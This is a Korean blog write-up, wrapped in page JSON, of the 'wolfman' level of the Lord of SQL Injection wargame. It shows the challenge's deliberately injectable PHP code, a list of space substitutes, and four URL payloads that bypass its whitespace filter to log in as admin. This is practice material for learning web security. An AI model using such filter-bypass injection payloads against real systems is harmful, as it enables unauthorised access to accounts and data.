{"pageProps":{"post":{"slug":"2017-08-12-LOS-wolfman","content":"![](/assets/posts/los/wolfman.png)\n\n`query: select id from prob_wolfman where id='guest' and pw=''`\n\n```php\n<?php \n\n  include \"./config.php\"; \n  login_chk(); \n  dbconnect(); \n  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\"); \n  if(preg_match('/ /i', $_GET[pw])) exit(\"No whitespace ~_~\"); \n  $query = \"select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'\"; \n  echo \"<hr>query : <strong>{$query}</strong><hr><br>\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if($result['id']) echo \"<h2>Hello {$result[id]}</h2>\"; \n  if($result['id'] == 'admin') solve(\"wolfman\"); \n  highlight_file(__FILE__); \n?>\n```\n공백 필터링이 있는 문제다.\n저번처럼 id는 guest로 고정되어있고 id는 admin이 되어야 문제가 풀린다.\n\n공백이 필터링 되어있을 때 대신할 수 있는 것은\n```\n1. TAB :  %09\n2. \\n : %0a\n3. \\r : %0d\n4. 주석 : /**/\n5. 괄호 : ()\n6. +\n```\n\n등등이 있는데\n이 문제에선 괄호가 안먹힌다.\n그래서 TAB,\\n,\\r,주석의 경우를 다 테스트 해봤다.\n\n```\nTAB : ?pw=%27%09or%09id=%27admin\n\\n : ?pw=%27%0aor%0aid=%27admin\n\\r : ?pw=%27%0dor%0did=%27admin\n주석 : ?pw=%27/**/or/**/id=%27admin\n```\n\n다양한 시도를 해서 푼 화면이다.\n![](/assets/posts/los/wolfman_clear1.png)\n![](/assets/posts/los/wolfman_clear2.png)\n\n\n울프맨 클리어!\n","layout":"post","title":"[LOS] wolfman","categories":["LOS"],"excerpt":" ","comments":true,"share":true,"tags":["LOS","Web-hacking","wolfman","write-up"]}},"__N_SSG":true}